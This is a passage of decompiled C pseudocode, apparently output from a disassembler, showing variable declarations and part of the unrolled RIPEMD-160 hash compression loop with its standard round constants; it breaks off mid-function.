  int v400; // eax
  int v401; // r10d
  int v402; // r11d
  int v403; // edx
  int v404; // eax
  int v405; // edx
  int v406; // r11d
  int v407; // r8d
  int v408; // eax
  int v409; // r8d
  int v410; // edx
  int v411; // r9d
  int v412; // eax
  int v413; // r9d
  int v414; // r8d
  int v415; // r10d
  int v416; // eax
  int v417; // r9d
  int v418; // r11d
  int v419; // eax
  int v420; // r11d
  int v421; // r10d
  int v422; // edx
  int v423; // eax
  int v424; // edx
  int v425; // r11d
  int v426; // r8d
  int v427; // eax
  int v428; // r8d
  int v429; // edx
  int v430; // r9d
  int v431; // eax
  int v432; // r8d
  int v433; // r9d
  int v434; // r10d
  int v435; // eax
  int v436; // r10d
  int v437; // r9d
  int v438; // ebx
  int v439; // eax
  int v440; // r10d
  int v441; // r11d
  int v442; // edi
  int v443; // ebx
  int v444; // r11d
  int v445; // ebx
  int v446; // edi
  int v447; // esi
  int v448; // ebx
  int v449; // ebp
  int v450; // edi
  int v451; // esi
  int v452; // edx
  int v453; // ebp
  int v454; // esi
  int v455; // ebp
  int v456; // eax
  int v457; // edx
  int v458; // ebp
  int v459; // edx
  int v460; // eax
  int v461; // r9d
  int v462; // edx
  int v463; // r8d
  int v464; // r10d
  int v465; // r9d
  int v466; // r8d
  int v467; // r11d
  int v468; // r9d
  int v469; // r10d
  int v470; // eax
  int v471; // r11d
  int v472; // r10d
  int v473; // r11d
  int v474; // eax
  int v475; // edx
  int v476; // r11d
  int v477; // r8d
  int v478; // eax
  int v479; // r8d
  int v480; // r9d
  int v481; // edx
  int v482; // r9d
  int v483; // r10d
  int v484; // r9d
  int v485; // r8d
  int v486; // r10d
  int v487; // r11d
  int v488; // r10d
  int v489; // r9d
  int v490; // r11d
  int v491; // eax
  int v492; // r11d
  int v493; // r10d
  int v494; // eax
  int v495; // edx
  int v496; // r11d
  int v497; // eax
  int v498; // edi
  int v499; // edx
  int v500; // ebx
  int v501; // eax
  int v502; // ebx
  int v503; // edi
  int v504; // r10d
  int v505; // edi
  int v506; // ebx
  int v507; // r10d
  int v508; // r11d
  int v509; // edi
  int v510; // r9d
  int v511; // r10d
  int v512; // esi
  int v513; // edx
  int v514; // r9d
  int v515; // r8d
  int v516; // r11d
  int v517; // r8d
  int v518; // eax
  int v519; // edx
  int v520; // r8d
  int v521; // edi
  int v522; // edx
  int v523; // eax
  int v524; // r10d
  int v525; // [rsp+0h] [rbp-98h]
  int v526; // [rsp+4h] [rbp-94h]
  int v527; // [rsp+8h] [rbp-90h]
  int v528; // [rsp+Ch] [rbp-8Ch]
  int v529; // [rsp+10h] [rbp-88h]
  int v530; // [rsp+14h] [rbp-84h]
  int v531; // [rsp+18h] [rbp-80h]
  int v532; // [rsp+1Ch] [rbp-7Ch]
  int v533; // [rsp+20h] [rbp-78h]
  int v534; // [rsp+24h] [rbp-74h]
  int v535; // [rsp+28h] [rbp-70h]
  int v536; // [rsp+2Ch] [rbp-6Ch]
  int v537; // [rsp+30h] [rbp-68h]
  int v538; // [rsp+34h] [rbp-64h]
  int v539; // [rsp+38h] [rbp-60h]
  int v540; // [rsp+3Ch] [rbp-5Ch]
  int v541; // [rsp+40h] [rbp-58h]
  int v542; // [rsp+44h] [rbp-54h]
  int v543; // [rsp+48h] [rbp-50h]
  int v544; // [rsp+4Ch] [rbp-4Ch]
  int v545; // [rsp+50h] [rbp-48h]
  int v546; // [rsp+54h] [rbp-44h]
  unsigned __int8 *v547; // [rsp+A8h] [rbp+10h]
  __int64 v548; // [rsp+B0h] [rbp+18h]
  int v549; // [rsp+B8h] [rbp+20h]

  if ( a3 )
  {
    v3 = a1[1];
    v4 = a3;
    v6 = a1[4];
    v7 = a1[3];
    v8 = a1[2];
    v537 = v8;
    v536 = v3;
    v538 = v7;
    v539 = v6;
    do
    {
      v548 = v4 - 1;
      v527 = (a2[3] << 24) | (a2[2] << 16) | (a2[1] << 8) | *a2;
      v9 = v6 + __ROL4__(v527 + *a1 + (v3 ^ v7 ^ v8), 11);
      v543 = __ROL4__(v8, 10);
      v549 = (a2[7] << 24) | (a2[6] << 16) | *((unsigned __int16 *)a2 + 2);
      v10 = v7 + __ROL4__(v549 + v6 + (v9 ^ v543 ^ v3), 14);
      v544 = __ROL4__(v3, 10);
      v11 = v9 ^ v544 ^ v10;
      v12 = __ROL4__(v9, 10);
      v13 = v543 + __ROL4__(((a2[11] << 24) | (a2[10] << 16) | *((unsigned __int16 *)a2 + 4)) + v7 + v11, 15);
      v526 = (a2[11] << 24) | (a2[10] << 16) | *((unsigned __int16 *)a2 + 4);
      v528 = (a2[15] << 24) | (a2[14] << 16) | (a2[13] << 8) | a2[12];
      v14 = v12 ^ v13 ^ v10;
      v15 = __ROL4__(v10, 10);
      v530 = (a2[19] << 24) | (a2[18] << 16) | *((unsigned __int16 *)a2 + 8);
      v16 = v544 + __ROL4__(v543 + v528 + v14, 12);
      v17 = v16 ^ v13 ^ v15;
      v18 = __ROL4__(v13, 10);
      v19 = v12 + __ROL4__(v544 + v530 + v17, 5);
      v531 = (a2[23] << 24) | (a2[22] << 16) | *((unsigned __int16 *)a2 + 10);
      v20 = v19 ^ v16 ^ v18;
      v21 = __ROL4__(v16, 10);
      v22 = v19 ^ v21;
      v23 = v15 + __ROL4__(v12 + v531 + v20, 8);
      v24 = __ROL4__(v19, 10);
      v525 = (a2[27] << 24) | (a2[26] << 16) | (a2[25] << 8) | a2[24];
      v25 = v18 + __ROL4__(v15 + v525 + (v23 ^ v22), 7);
      v533 = (a2[31] << 24) | (a2[30] << 16) | *((unsigned __int16 *)a2 + 14);
      v534 = (a2[35] << 24) | (a2[34] << 16) | (a2[33] << 8) | a2[32];
      v26 = v18 + v533 + (v23 ^ v24 ^ v25);
      v27 = __ROL4__(v23, 10);
      v28 = v21 + __ROL4__(v26, 9);
      v29 = v28 ^ v25;
      v30 = __ROL4__(v25, 10);
      v529 = (a2[39] << 24) | (a2[38] << 16) | *((unsigned __int16 *)a2 + 18);
      v31 = v24 + __ROL4__(v21 + v534 + (v27 ^ v29), 11);
      v32 = v31 ^ v28 ^ v30;
      v33 = __ROL4__(v28, 10);
      v34 = v27 + __ROL4__(v24 + v529 + v32, 13);
      v540 = (a2[43] << 24) | (a2[42] << 16) | *((unsigned __int16 *)a2 + 20);
      v35 = v34 ^ v31 ^ v33;
      v36 = __ROL4__(v31, 10);
      v37 = v30 + __ROL4__(v27 + v540 + v35, 14);
      v532 = (a2[47] << 24) | (a2[46] << 16) | *((unsigned __int16 *)a2 + 22);
      v542 = (a2[51] << 24) | (a2[50] << 16) | (a2[49] << 8) | a2[48];
      v38 = v30 + v532 + (v37 ^ v34 ^ v36);
      v39 = __ROL4__(v34, 10);
      v40 = v33 + __ROL4__(v38, 15);
      v41 = v33 + v542 + (v37 ^ v39 ^ v40);
      v42 = v40;
      v43 = __ROL4__(v37, 10);
      v44 = __ROL4__(v40, 10);
      v45 = v36 + __ROL4__(v41, 6);
      v535 = (a2[55] << 24) | (a2[54] << 16) | *((unsigned __int16 *)a2 + 26);
      v541 = (a2[59] << 24) | (a2[58] << 16) | *((unsigned __int16 *)a2 + 28);
      v46 = v39 + __ROL4__(v36 + v535 + (v43 ^ v45 ^ v42), 7);
      v547 = a2 + 64;
      v545 = (a2[63] << 24) | (a2[62] << 16) | *((unsigned __int16 *)a2 + 30);
      v47 = v45 ^ v44;
      v48 = __ROL4__(v45, 10);
      v49 = v39 + v541 + (v46 ^ v47);
      v50 = v46 ^ v48;
      v51 = v43 + __ROL4__(v49, 9);
      v52 = __ROL4__(v46, 10);
      v53 = v44 + __ROL4__(v43 + v545 + (v51 ^ v50), 8);
      v54 = v48 + __ROL4__(v533 + (v52 ^ v53 & (v51 ^ v52)) + 1518500249 + v44, 7);
      v55 = __ROL4__(v51, 10);
      v56 = v53 ^ v55;
      v57 = __ROL4__(v53, 10);
      v58 = v530 + (v55 ^ v54 & v56) + 1518500249 + v48;
      v59 = v57 ^ v54;
      v60 = __ROL4__(v54, 10);
      v61 = v52 + __ROL4__(v58, 6);
      v62 = v535 + (v57 ^ v61 & v59) + 1518500249 + v52;
      v63 = v61 ^ v60;
      v64 = v55 + __ROL4__(v62, 8);
      v65 = __ROL4__(v61, 10);
      v66 = v549 + (v60 ^ v64 & v63) + 1518500249 + v55;
      v67 = v64 ^ v65;
      v68 = v57 + __ROL4__(v66, 13);
      v69 = __ROL4__(v64, 10);
      v70 = v540 + (v65 ^ v68 & v67) + 1518500249 + v57;
      v71 = v68 ^ v69;
      v72 = v60 + __ROL4__(v70, 11);
      v73 = __ROL4__(v68, 10);
      v74 = v525 + (v69 ^ v72 & v71) + 1518500249 + v60;
      v75 = v72 ^ v73;
      v76 = v65 + __ROL4__(v74, 9);
      v77 = __ROL4__(v72, 10);
      v78 = v545 + (v73 ^ v76 & v75) + 1518500249 + v65;
      v79 = v77 ^ v76;
      v80 = __ROL4__(v76, 10);
      v81 = v69 + __ROL4__(v78, 7);
      v82 = v73 + __ROL4__(v528 + (v77 ^ v81 & v79) + 1518500249 + v69, 15);
      v83 = v77 + __ROL4__(v542 + (v80 ^ v82 & (v81 ^ v80)) + 1518500249 + v73, 7);
      v84 = __ROL4__(v81, 10);
      v85 = v82 ^ v84;
      v86 = __ROL4__(v82, 10);
      v87 = v527 + (v84 ^ v83 & v85) + 1518500249 + v77;
      v88 = v83 ^ v86;
      v89 = v80 + __ROL4__(v87, 12);
      v90 = __ROL4__(v83, 10);
      v91 = v529 + (v86 ^ v89 & v88) + 1518500249 + v80;
      v92 = v89 ^ v90;
      v93 = v84 + __ROL4__(v91, 15);
      v94 = __ROL4__(v89, 10);
      v95 = v531 + (v90 ^ v93 & v92) + 1518500249 + v84;
      v96 = v94 ^ v93;
      v97 = __ROL4__(v93, 10);
      v98 = v86 + __ROL4__(v95, 9);
      v99 = v526 + (v94 ^ v98 & v96) + 1518500249 + v86;
      v100 = v98 ^ v97;
      v101 = v90 + __ROL4__(v99, 11);
      v102 = __ROL4__(v98, 10);
      v103 = v541 + (v97 ^ v101 & v100) + 1518500249 + v90;
      v104 = v101 ^ v102;
      v105 = v94 + __ROL4__(v103, 7);
      v106 = __ROL4__(v101, 10);
      v107 = v532 + (v102 ^ v105 & v104) + 1518500249 + v94;
      v108 = v105 ^ v106;
      v109 = v97 + __ROL4__(v107, 13);
      v110 = __ROL4__(v105, 10);
      v111 = v102 + __ROL4__(v534 + (v106 ^ v109 & v108) + 1518500249 + v97, 12);
      v112 = v106 + __ROL4__(v528 + (v110 ^ (v111 | ~v109)) + 1859775393 + v102, 11);
      v113 = __ROL4__(v109, 10);
      v114 = v111;
      v115 = __ROL4__(v111, 10);
      v116 = v540 + (v113 ^ (v112 | ~v114)) + 1859775393 + v106;
      v117 = ~v112;
      v118 = __ROL4__(v112, 10);
      v119 = v110 + __ROL4__(v116, 13);
      v120 = v541 + (v115 ^ (v119 | v117)) + 1859775393 + v110;
      v121 = ~v119;
      v122 = v113 + __ROL4__(v120, 6);
      v123 = __ROL4__(v119, 10);
      v124 = v530 + (v118 ^ (v122 | v121)) + 1859775393 + v113;
      v125 = ~v122;
      v126 = v115 + __ROL4__(v124, 7);
      v127 = __ROL4__(v122, 10);
      v128 = v529 + (v123 ^ (v126 | v125)) + 1859775393 + v115;
      v129 = ~v126;
      v130 = __ROL4__(v126, 10);
      v131 = v118 + __ROL4__(v128, 14);
      v132 = v545 + (v127 ^ (v131 | v129)) + 1859775393 + v118;
      v133 = ~v131;
      v134 = v123 + __ROL4__(v132, 9);
      v135 = __ROL4__(v131, 10);
      v136 = v534 + (v130 ^ (v134 | v133)) + 1859775393 + v123;
      v137 = ~v134;
      v138 = v127 + __ROL4__(v136, 13);
      v139 = __ROL4__(v134, 10);
      v140 = v130 + __ROL4__(v549 + (v135 ^ (v138 | v137)) + 1859775393 + v127, 15);
      v141 = v135 + __ROL4__(v526 + (v139 ^ (v140 | ~v138)) + 1859775393 + v130, 14);
      v142 = __ROL4__(v138, 10);
      v143 = ~v140;
      v144 = __ROL4__(v140, 10);
      v145 = v533 + (v142 ^ (v141 | v143)) + 1859775393 + v135;
      v146 = ~v141;
      v147 = v139 + __ROL4__(v145, 8);
      v148 = __ROL4__(v141, 10);
      v149 = v527 + (v144 ^ (v147 | v146)) + 1859775393 + v139;
      v150 = ~v147;
      v151 = __ROL4__(v147, 10);
      v152 = v142 + __ROL4__(v149, 13);
      v153 = v525 + (v148 ^ (v152 | v150)) + 1859775393 + v142;
      v154 = ~v152;
      v155 = v144 + __ROL4__(v153, 6);
      v156 = __ROL4__(v152, 10);
      v157 = v535 + (v151 ^ (v155 | v154)) + 1859775393 + v144;
      v158 = ~v155;
      v159 = __ROL4__(v155, 10);
      v160 = v148 + __ROL4__(v157, 5);
      v161 = v532 + (v156 ^ (v160 | v158)) + 1859775393 + v148;
      v162 = ~v160;
      v163 = v151 + __ROL4__(v161, 12);
      v164 = __ROL4__(v160, 10);
      v165 = v531 + (v159 ^ (v163 | v162)) + 1859775393 + v151;
      v166 = ~v163;
      v167 = v156 + __ROL4__(v165, 7);
      v168 = __ROL4__(v163, 10);
      v169 = v159 + __ROL4__(v542 + (v164 ^ (v167 | v166)) + 1859775393 + v156, 5);
      v170 = v167 ^ v168 & (v169 ^ v167);
      v171 = __ROL4__(v167, 10);
      v172 = v164 + __ROL4__(v549 + v170 - 1894007588 + v159, 11);
      v173 = v169 ^ v171 & (v172 ^ v169);
      v174 = __ROL4__(v169, 10);
      v175 = v168 + __ROL4__(v529 + v173 - 1894007588 + v164, 12);
      v176 = v172 ^ v174 & (v175 ^ v172);
      v177 = __ROL4__(v172, 10);
      v178 = v171 + __ROL4__(v532 + v176 - 1894007588 + v168, 14);
      v179 = v175 ^ v177 & (v178 ^ v175);
      v180 = __ROL4__(v175, 10);
      v181 = v174 + __ROL4__(v540 + v179 - 1894007588 + v171, 15);
      v182 = v178 ^ v180 & (v178 ^ v181);
      v183 = __ROL4__(v178, 10);
      v184 = v177 + __ROL4__(v527 + v182 - 1894007588 + v174, 14);
      v185 = v181 ^ v183 & (v184 ^ v181);
      v186 = __ROL4__(v181, 10);
      v187 = v180 + __ROL4__(v534 + v185 - 1894007588 + v177, 15);
      v188 = v184 ^ v186 & (v187 ^ v184);
      v189 = __ROL4__(v184, 10);
      v190 = v183 + __ROL4__(v542 + v188 - 1894007588 + v180, 9);
      v191 = v187 ^ v189 & (v190 ^ v187);
      v192 = __ROL4__(v187, 10);
      v193 = v186 + __ROL4__(v530 + v191 - 1894007588 + v183, 8);
      v194 = v190 ^ v192 & (v193 ^ v190);
      v195 = __ROL4__(v190, 10);
      v196 = v189 + __ROL4__(v535 + v194 - 1894007588 + v186, 9);
      v197 = v193 ^ v195 & (v193 ^ v196);
      v198 = __ROL4__(v193, 10);
      v199 = v192 + __ROL4__(v528 + v197 - 1894007588 + v189, 14);
      v200 = v196 ^ v198 & (v199 ^ v196);
      v201 = __ROL4__(v196, 10);
      v202 = v195 + __ROL4__(v533 + v200 - 1894007588 + v192, 5);
      v203 = v199 ^ v201 & (v202 ^ v199);
      v204 = __ROL4__(v199, 10);
      v205 = v198 + __ROL4__(v545 + v203 - 1894007588 + v195, 6);
      v206 = v202 ^ v204 & (v205 ^ v202);
      v207 = __ROL4__(v202, 10);
      v208 = v201 + __ROL4__(v541 + v206 - 1894007588 + v198, 8);
      v209 = v205 ^ v207 & (v208 ^ v205);
      v210 = __ROL4__(v205, 10);
      v211 = v204 + __ROL4__(v531 + v209 - 1894007588 + v201, 6);
      v212 = v208 ^ v210 & (v208 ^ v211);
      v213 = __ROL4__(v208, 10);
      v214 = v207 + __ROL4__(v525 + v212 - 1894007588 + v204, 5);
      v215 = v211 ^ v213 & (v214 ^ v211);
      v216 = __ROL4__(v211, 10);
      v217 = v210 + __ROL4__(v526 + v215 - 1894007588 + v207, 12);
      v218 = v217 ^ (v214 | ~v216);
      v219 = __ROL4__(v214, 10);
      v220 = v213 + __ROL4__(v530 + v218 - 1454113458 + v210, 9);
      v221 = (v220 ^ (v217 | ~v219)) - 1454113458;
      v222 = __ROL4__(v217, 10);
      v223 = v216 + __ROL4__(v527 + v221 + v213, 15);
      v224 = v223 ^ (v220 | ~v222);
      v225 = __ROL4__(v220, 10);
      v226 = v219 + __ROL4__(v531 + v224 - 1454113458 + v216, 5);
      v227 = v226 ^ (v223 | ~v225);
      v228 = __ROL4__(v223, 10);
      v229 = v222 + __ROL4__(v529 + v227 - 1454113458 + v219, 11);
      v230 = v229 ^ (v226 | ~v228);
      v231 = __ROL4__(v226, 10);
      v232 = v225 + __ROL4__(v533 + v230 - 1454113458 + v222, 6);
      v233 = v232 ^ (v229 | ~v231);
      v234 = __ROL4__(v229, 10);
      v235 = v228 + __ROL4__(v542 + v233 - 1454113458 + v225, 8);
      v236 = v235 ^ (v232 | ~v234);
      v237 = __ROL4__(v232, 10);
      v238 = v231 + __ROL4__(v526 + v236 - 1454113458 + v228, 13);
      v239 = v238 ^ (v235 | ~v237);
      v240 = __ROL4__(v235, 10);
      v241 = v234 + __ROL4__(v540 + v239 - 1454113458 + v231, 12);
      v242 = v241 ^ (v238 | ~v240);
      v243 = __ROL4__(v238, 10);
      v244 = v237 + __ROL4__(v541 + v242 - 1454113458 + v234, 5);
      v245 = v549 + (v244 ^ (v241 | ~v243)) - 1454113458 + v237;
      v246 = __ROL4__(v241, 10);
      v247 = v240 + __ROL4__(v245, 12);
      v248 = v247 ^ (v244 | ~v246);
      v249 = __ROL4__(v244, 10);
      v250 = __ROL4__(v528 + v248 - 1454113458 + v240, 13);
      v251 = v247 | ~v249;
      v252 = v243 + v250;
      v253 = __ROL4__(v247, 10);
      v254 = v252 | ~v253;
      v255 = v246 + __ROL4__(v534 - 1454113458 + (v252 ^ v251) + v243, 14);
      v256 = __ROL4__(v252, 10);
      v257 = v249 + __ROL4__(v246 + v532 - 1454113458 + (v255 ^ v254), 11);
      v546 = __ROL4__(v255, 10);
      v258 = v253 + __ROL4__(v525 + (v257 ^ (v255 | ~v256)) + v249 - 1454113458, 8);
      v259 = v545 + (v258 ^ (v257 | ~v546));
      v260 = __ROL4__(v257, 10);
      v261 = v256 + __ROL4__(v259 + v253 - 1454113458, 5);
      v262 = v546 + __ROL4__(v535 + (v261 ^ (v258 | ~v260)) + v256 - 1454113458, 6);
      v263 = v539 + __ROL4__(*a1 + (v536 ^ (v537 | ~v538)) + v531 + 1352829926, 8);
      v264 = v538 + __ROL4__(v541 + v539 + 1352829926 + (v263 ^ (~v543 | v536)), 9);
      v265 = v264 ^ (v263 | ~v544);
      v266 = __ROL4__(v263, 10);
      v267 = v543 + __ROL4__(v538 + v265 + v533 + 1352829926, 9);
      v268 = v267 ^ (v264 | ~v266);
      v269 = __ROL4__(v264, 10);
      v270 = v544 + __ROL4__(v527 + v268 + v543 + 1352829926, 11);
      v271 = v270 ^ (v267 | ~v269);
      v272 = __ROL4__(v267, 10);
      v273 = v266 + __ROL4__(v529 + v271 + v544 + 1352829926, 13);
      v274 = v273 ^ (v270 | ~v272);
      v275 = __ROL4__(v270, 10);
      v276 = v269 + __ROL4__(v526 + v274 + 1352829926 + v266, 15);
      v277 = v276 ^ (v273 | ~v275);
      v278 = __ROL4__(v273, 10);
      v279 = v272 + __ROL4__(v532 + v277 + 1352829926 + v269, 15);
      v280 = v279 ^ (v276 | ~v278);
      v281 = __ROL4__(v276, 10);
      v282 = v275 + __ROL4__(v530 + v280 + 1352829926 + v272, 5);
      v283 = v278 + __ROL4__(v535 + (v282 ^ (v279 | ~v281)) + 1352829926 + v275, 7);
      v284 = __ROL4__(v279, 10);
      v285 = v283 ^ (v282 | ~v284);
      v286 = __ROL4__(v282, 10);
      v287 = v281 + __ROL4__(v525 + v285 + 1352829926 + v278, 7);
      v288 = v287 ^ (v283 | ~v286);
      v289 = __ROL4__(v283, 10);
      v290 = v284 + __ROL4__(v545 + v288 + 1352829926 + v281, 8);
      v291 = v290 ^ (v287 | ~v289);
      v292 = __ROL4__(v287, 10);
      v293 = v286 + __ROL4__(v534 + v291 + 1352829926 + v284, 11);
      v294 = v293 ^ (v290 | ~v292);
      v295 = __ROL4__(v290, 10);
      v296 = v289 + __ROL4__(v549 + v294 + 1352829926 + v286, 14);
      v297 = v296 ^ (v293 | ~v295);
      v298 = __ROL4__(v293, 10);
      v299 = v292 + __ROL4__(v540 + v297 + 1352829926 + v289, 14);
      v300 = v299 ^ (v296 | ~v298);
      v301 = __ROL4__(v296, 10);
      v302 = v295 + __ROL4__(v528 + v300 + 1352829926 + v292, 12);
      v303 = v302 ^ (v299 | ~v301);
      v304 = __ROL4__(v299, 10);
      v305 = v298 + __ROL4__(v542 + v303 + 1352829926 + v295, 6);
      v306 = v301 + __ROL4__(v525 + (v302 ^ v304 & (v305 ^ v302)) + 1548603684 + v298, 9);
      v307 = __ROL4__(v302, 10);
      v308 = v305 ^ v307 & (v305 ^ v306);
      v309 = __ROL4__(v305, 10);
      v310 = v304 + __ROL4__(v532 + v308 + 1548603684 + v301, 13);
      v311 = v306 ^ v309 & (v310 ^ v306);
      v312 = __ROL4__(v306, 10);
      v313 = v307 + __ROL4__(v528 + v311 + 1548603684 + v304, 15);
      v314 = v310 ^ v312 & (v313 ^ v310);
      v315 = __ROL4__(v310, 10);
      v316 = v309 + __ROL4__(v533 + v314 + 1548603684 + v307, 7);
      v317 = v313 ^ v315 & (v316 ^ v313);
      v318 = __ROL4__(v313, 10);
      v319 = v312 + __ROL4__(v527 + v317 + 1548603684 + v309, 12);
      v320 = v316 ^ v318 & (v319 ^ v316);
      v321 = __ROL4__(v316, 10);
      v322 = v315 + __ROL4__(v535 + v320 + 1548603684 + v312, 8);
      v323 = v319 ^ v321 & (v319 ^ v322);
      v324 = __ROL4__(v319, 10);
      v325 = v318 + __ROL4__(v531 + v323 + 1548603684 + v315, 9);
      v326 = v322 ^ v324 & (v325 ^ v322);
      v327 = __ROL4__(v322, 10);
      v328 = v321 + __ROL4__(v540 + v326 + 1548603684 + v318, 11);
      v329 = v324 + __ROL4__(v541 + (v325 ^ v327 & (v328 ^ v325)) + 1548603684 + v321, 7);
      v330 = __ROL4__(v325, 10);
      v331 = v328 ^ v330 & (v329 ^ v328);
      v332 = __ROL4__(v328, 10);
      v333 = v327 + __ROL4__(v545 + v331 + 1548603684 + v324, 7);
      v334 = v329 ^ v332 & (v333 ^ v329);
      v335 = __ROL4__(v329, 10);
      v336 = v330 + __ROL4__(v534 + v334 + 1548603684 + v327, 12);
      v337 = v333 ^ v335 & (v333 ^ v336);
      v338 = __ROL4__(v333, 10);
      v339 = v332 + __ROL4__(v542 + v337 + 1548603684 + v330, 7);
      v340 = v336 ^ v338 & (v339 ^ v336);
      v341 = __ROL4__(v336, 10);
      v342 = v335 + __ROL4__(v530 + v340 + 1548603684 + v332, 6);
      v343 = v339 ^ v341 & (v342 ^ v339);
      v344 = __ROL4__(v339, 10);
      v345 = v338 + __ROL4__(v529 + v343 + 1548603684 + v335, 15);
      v346 = v342 ^ v344 & (v345 ^ v342);
      v347 = __ROL4__(v342, 10);
      v348 = v341 + __ROL4__(v549 + v346 + 1548603684 + v338, 13);
      v349 = v345 ^ v347 & (v348 ^ v345);
      v350 = __ROL4__(v345, 10);
      v351 = v344 + __ROL4__(v526 + v349 + 1548603684 + v341, 11);
      v352 = v347 + __ROL4__(v545 + (v350 ^ (v351 | ~v348)) + 1836072691 + v344, 9);
      v353 = __ROL4__(v348, 10);
      v354 = v352 | ~v351;
      v355 = __ROL4__(v351, 10);
      v356 = v531 + (v353 ^ v354) + 1836072691 + v347;
      v357 = ~v352;
      v358 = v350 + __ROL4__(v356, 7);
      v359 = __ROL4__(v352, 10);
      v360 = v549 + (v355 ^ (v358 | v357)) + 1836072691 + v350;
      v361 = ~v358;
      v362 = __ROL4__(v358, 10);
      v363 = v353 + __ROL4__(v360, 15);
      v364 = v528 + (v359 ^ (v363 | v361)) + 1836072691 + v353;
      v365 = ~v363;
      v366 = v355 + __ROL4__(v364, 11);
      v367 = __ROL4__(v363, 10);
      v368 = v533 + (v362 ^ (v366 | v365)) + 1836072691 + v355;
      v369 = ~v366;
      v370 = __ROL4__(v366, 10);
      v371 = v359 + __ROL4__(v368, 8);
      v372 = v541 + (v367 ^ (v371 | v369)) + 1836072691 + v359;
      v373 = ~v371;
      v374 = v362 + __ROL4__(v372, 6);
      v375 = __ROL4__(v371, 10);
      v376 = v525 + (v370 ^ (v374 | v373)) + 1836072691 + v362;
      v377 = ~v374;
      v378 = v367 + __ROL4__(v376, 6);
      v379 = __ROL4__(v374, 10);
      v380 = v529 + (v375 ^ (v378 | v377)) + 1836072691 + v367;
      v381 = ~v378;
      v382 = v370 + __ROL4__(v380, 14);
      v383 = __ROL4__(v378, 10);
      v384 = v375 + __ROL4__(v532 + (v379 ^ (v382 | v381)) + 1836072691 + v370, 12);
      v385 = v383 ^ (v384 | ~v382);
      v386 = __ROL4__(v382, 10);
      v387 = v534 + v385 + 1836072691 + v375;
      v388 = ~v384;
      v389 = v379 + __ROL4__(v387, 13);
      v390 = __ROL4__(v384, 10);
      v391 = v542 + (v386 ^ (v389 | v388)) + 1836072691 + v379;
      v392 = ~v389;
      v393 = __ROL4__(v389, 10);
      v394 = v383 + __ROL4__(v391, 5);
      v395 = v526 + (v390 ^ (v394 | v392)) + 1836072691 + v383;
      v396 = ~v394;
      v397 = v386 + __ROL4__(v395, 14);
      v398 = __ROL4__(v394, 10);
      v399 = v540 + (v393 ^ (v397 | v396)) + 1836072691 + v386;
      v400 = ~v397;
      v401 = __ROL4__(v397, 10);
      v402 = v390 + __ROL4__(v399, 13);
      v403 = v527 + (v398 ^ (v402 | v400)) + 1836072691 + v390;
      v404 = ~v402;
      v405 = v393 + __ROL4__(v403, 13);
      v406 = __ROL4__(v402, 10);
      v407 = v530 + (v401 ^ (v405 | v404)) + 1836072691 + v393;
      v408 = ~v405;
      v409 = v398 + __ROL4__(v407, 7);
      v410 = __ROL4__(v405, 10);
      v411 = v535 + (v406 ^ (v409 | v408)) + 1836072691 + v398;
      v412 = v410 ^ v409;
      v413 = v401 + __ROL4__(v411, 5);
      v414 = __ROL4__(v409, 10);
      v415 = v406 + __ROL4__(v534 + (v410 ^ v413 & v412) + 2053994217 + v401, 15);
      v416 = (v414 ^ v415 & (v413 ^ v414)) + 2053994217;
      v417 = __ROL4__(v413, 10);
      v418 = v525 + v416 + v406;
      v419 = v415 ^ v417;
      v420 = v410 + __ROL4__(v418, 5);
      v421 = __ROL4__(v415, 10);
      v422 = v530 + (v417 ^ v420 & v419) + 2053994217 + v410;
      v423 = v420 ^ v421;
      v424 = v414 + __ROL4__(v422, 8);
      v425 = __ROL4__(v420, 10);
      v426 = v549 + (v421 ^ v424 & v423) + 2053994217 + v414;
      v427 = v424 ^ v425;
      v428 = v417 + __ROL4__(v426, 11);
      v429 = __ROL4__(v424, 10);
      v430 = v528 + (v425 ^ v428 & v427) + 2053994217 + v417;
      v431 = v429 ^ v428;
      v432 = __ROL4__(v428, 10);
      v433 = v421 + __ROL4__(v430, 14);
      v434 = v532 + (v429 ^ v433 & v431) + 2053994217 + v421;
      v435 = v433 ^ v432;
      v436 = v425 + __ROL4__(v434, 14);
      v437 = __ROL4__(v433, 10);
      v438 = v436 ^ v437;
      v439 = v545 + 2053994217 + (v432 ^ v436 & v435);
      v440 = __ROL4__(v436, 10);
      v441 = v429 + __ROL4__(v439 + v425, 6);
      v442 = v441 ^ v440;
      v443 = v437 ^ v441 & v438;
      v444 = __ROL4__(v441, 10);
      v445 = v432 + __ROL4__(v429 + v527 + v443 + 2053994217, 14);
      v446 = v437 + __ROL4__(v432 + v531 + (v440 ^ v445 & v442) + 2053994217, 6);
      v447 = (v444 ^ v446 & (v445 ^ v444)) + v542 + 2053994217;
      v448 = __ROL4__(v445, 10);
      v449 = v448 ^ v446;
      v450 = __ROL4__(v446, 10);
      v451 = v440 + __ROL4__(v437 + v447, 9);
      v452 = v451 ^ v450;
      v453 = v448 ^ v451 & v449;
      v454 = __ROL4__(v451, 10);
      v455 = v444 + __ROL4__(v440 + v526 + v453 + 2053994217, 12);
      v456 = v455 ^ v454;
      v457 = v450 ^ v455 & v452;
      v458 = __ROL4__(v455, 10);
      v459 = v448 + __ROL4__(v444 + v535 + v457 + 2053994217, 9);
      v460 = v459 & v456;
      v461 = v459 ^ v458;
      v462 = __ROL4__(v459, 10);
      v463 = v450 + __ROL4__(v529 + (v454 ^ v460) + v448 + 2053994217, 12);
      v464 = v463 ^ v462;
      v465 = v458 ^ v463 & v461;
      v466 = __ROL4__(v463, 10);
      v467 = v454 + __ROL4__(v450 + v533 + v465 + 2053994217, 5);
      v468 = __ROL4__(v467, 10);
      v469 = v458 + __ROL4__(v454 + v540 + (v462 ^ v467 & v464) + 2053994217, 15);
      v470 = v469 ^ v468;
      v471 = v466 ^ v469 & (v466 ^ v467);
      v472 = __ROL4__(v469, 10);
      v473 = v462 + __ROL4__(v458 + v541 + v471 + 2053994217, 8);
      v474 = v466 + __ROL4__(v462 + v542 + (v473 ^ v470), 8);
      v475 = v468 + __ROL4__(v466 + v545 + (v474 ^ v473 ^ v472), 5);
      v476 = __ROL4__(v473, 10);
      v477 = v474 ^ v476;
      v478 = __ROL4__(v474, 10);
      v479 = v472 + __ROL4__(v468 + v540 + (v475 ^ v477), 12);
      v480 = v475 ^ v478 ^ v479;
      v481 = __ROL4__(v475, 10);
      v482 = v472 + v530 + v480;
      v483 = v479;
      v484 = v476 + __ROL4__(v482, 9);
      v485 = __ROL4__(v479, 10);
      v486 = v476 + v549 + (v481 ^ v484 ^ v483);
      v487 = v484 ^ v485;
      v488 = v478 + __ROL4__(v486, 12);
      v489 = __ROL4__(v484, 10);
